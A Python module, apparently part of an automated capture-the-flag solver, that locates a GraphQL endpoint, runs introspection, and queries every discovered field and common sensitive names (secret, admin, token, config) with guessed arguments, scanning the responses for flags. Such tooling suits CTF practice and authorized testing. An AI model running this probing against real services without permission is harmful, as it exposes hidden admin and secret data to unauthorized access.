"""GraphQL introspection hunting.

Apps that expose a /graphql endpoint often hide a `flag` / `secret` /
`admin` query field that is discoverable via introspection:

    POST /graphql  {"query": "{__schema{queryType{fields{name}}}}"}
    POST /graphql  {"query": "{ flag }"}

Auto flow: find the endpoint, introspect, then query every returned field
name (plus common names) and scan the JSON for flags.
"""
import json
import re

from core import httpx
from core.flag import extract_flags

_INTROSPECTION = "{__schema{queryType{fields{name description}}}}"
_COMMON_FIELDS = ["flag", "secret", "admin", "token", "key", "users", "user",
                  "me", "debug", "config", "environment", "env", "health"]


def _post(url, query, timeout=8):
    r = httpx.post(url, data=json.dumps({"query": query}),
                   headers={"Content-Type": "application/json"}, timeout=timeout)
    if r is None:
        return None, {}
    try:
        return r, json.loads(r.text)
    except Exception:
        return r, {}


def _find_graphql(base, endpoints):
    for ep in endpoints:
        p = ep.split("?")[0].rstrip("/").lower()
        if p.endswith("/graphql") or p.endswith("/graphiql"):
            return ep
    # probe common paths if not in the discovered list
    for cand in ("/graphql", "/api/graphql", "/graphql/v1", "/graphiql"):
        u = base + cand
        r, j = _post(u, "{__typename}")
        if r is not None and r.status == 200 and ("data" in j or "errors" in j):
            return u
    return None


def scan_graphql(base, endpoints):
    """Returns (findings, flags)."""
    ep = _find_graphql(base, endpoints)
    if not ep:
        return [], []
    findings = []
    flags = []

    # 1) introspection
    r, j = _post(ep, _INTROSPECTION)
    fields = []
    if r is not None:
        try:
            qf = j["data"]["__schema"]["queryType"]["fields"]
            fields = [f["name"] for f in qf if isinstance(f, dict)]
            findings.append(
                f"  [i] GraphQL {ep}: introspection เปิด — พบ {len(fields)} query field: "
                + ", ".join(fields[:12]))
        except Exception:
            pass
    known, cands = extract_flags(r.text if r else "")
    flags.extend(known + cands)

    # 2) query every discovered/common field
    to_try = list(dict.fromkeys(fields + _COMMON_FIELDS))
    for name in to_try[:20]:
        q = f"{{ {name} }}"
        rr, jj = _post(ep, q)
        if rr is None:
            continue
        body = rr.text
        known, cands = extract_flags(body)
        new_flags = known + cands
        if new_flags:
            findings.append(f"  [!] GraphQL {ep}: query {{{name}}} → flag!")
            flags.extend(new_flags)
            break
        # field with required args — try a couple of arg shapes
        if "errors" in jj and isinstance(jj.get("errors"), list):
            err = json.dumps(jj["errors"])[:200]
            args = re.findall(r"argument\\s+[\"']?([a-zA-Z_][a-zA-Z0-9_]*)", err, re.I)
            args = list(dict.fromkeys(args))[:2]
            for a in args:
                for val in ("1", "\"admin\"", "\"flag\""):
                    rr2, _ = _post(ep, f'{{ {name}({a}: {val}) }}')
                    if rr2 is None:
                        continue
                    known, cands = extract_flags(rr2.text)
                    if known + cands:
                        findings.append(f"  [!] GraphQL {ep}: {{{name}({a}: {val})}} → flag!")
                        flags.extend(known + cands)
                        break
    return findings, list(dict.fromkeys(flags))
